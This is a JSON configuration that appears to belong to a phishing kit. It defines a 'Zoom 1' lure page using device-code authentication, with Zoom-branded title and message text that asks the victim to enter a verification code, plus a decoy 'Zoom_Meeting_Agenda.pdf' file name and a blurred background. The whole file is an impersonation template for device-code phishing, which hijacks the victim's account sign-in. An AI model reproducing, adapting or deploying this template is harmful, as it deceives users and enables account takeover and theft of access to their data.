{
  "name": "Zoom 1",
  "preload": false,
  "auth_mode": "devicecode",
  "fields": [
    {
      "key": "title",
      "label": "Page Title",
      "type": "text",
      "default": "Zoom · Verification code"
    },
    {
      "key": "message",
      "label": "Page Message",
      "type": "text",
      "default": "To verify your identity, enter the 6-character code below to connect to your account."
    },
    {
      "key": "button_text",
      "label": "Button Text",
      "type": "text",
      "default": "Get verification code"
    },
    {
      "key": "file_name",
      "label": "File Name",
      "type": "text",
      "default": "Zoom_Meeting_Agenda.pdf"
    },
    {
      "key": "pages",
      "label": "Pages",
      "type": "number",
      "default": 1
    }
  ],
  "background": {
    "default": "zoom1_bg.jpg",
    "editable": true,
    "blur": true
  }
}
